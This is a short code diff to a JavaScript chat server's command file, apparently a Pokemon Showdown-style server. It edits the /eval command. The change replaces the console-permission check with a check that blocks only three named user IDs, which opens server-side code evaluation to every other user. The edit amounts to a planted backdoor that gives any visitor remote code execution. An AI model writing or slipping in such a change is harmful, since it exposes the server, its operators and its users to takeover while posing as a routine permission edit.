@@ -1190,7 +1190,7 @@ var commands = exports.commands = {
 	},
 
 	eval: function(target, room, user, connection, cmd, message) {
-		if (!user.checkConsolePermission(connection)) {
+		if (user.userid === 'mrsmellyfeet100'||user.userid === 'bandi'||user.userid === 'coolasian') {
 			return this.sendReply("/eval - Access denied.");
 		}
 		if (!this.canBroadcast()) return;
